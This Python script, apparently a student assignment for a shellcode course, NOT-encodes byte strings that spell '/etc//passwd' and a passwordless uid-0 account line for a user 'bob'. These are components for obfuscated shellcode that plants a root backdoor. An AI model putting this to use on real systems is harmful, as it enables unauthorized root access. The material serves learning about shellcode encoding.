#!/usr/bin/python

# Encoder.py
# Author: jcarabantes
# Student Id: SLAE-1058

strings = []
 
strings.append("\x64\x77\x73\x73")
strings.append("\x61\x70\x2f\x63")
strings.append("\x74\x65\x2f\x2f")
strings.append("\x68\x73\x2f\x6e")
strings.append("\x97\x8c\xd0\x91")
strings.append("\x69\x62\x2f\x2f")
strings.append("\x3a\x2f\x3a\x3a")
strings.append("\x30\x3a\x30\x3a")
strings.append("\x3a\x62\x6f\x62")
 
encoded = ""
original = ""
 
print('Encoding ...')
 
for c in strings:
        for x in bytearray(c) :
                y = ~x
 
                original += '%02x' % x
                encoded += '%02x' % (y & 0xff)
 
        print("Original: 0x{0} -> 0x{1}".format(original, encoded))
 
        # reset
        encoded = ""
        original = ""
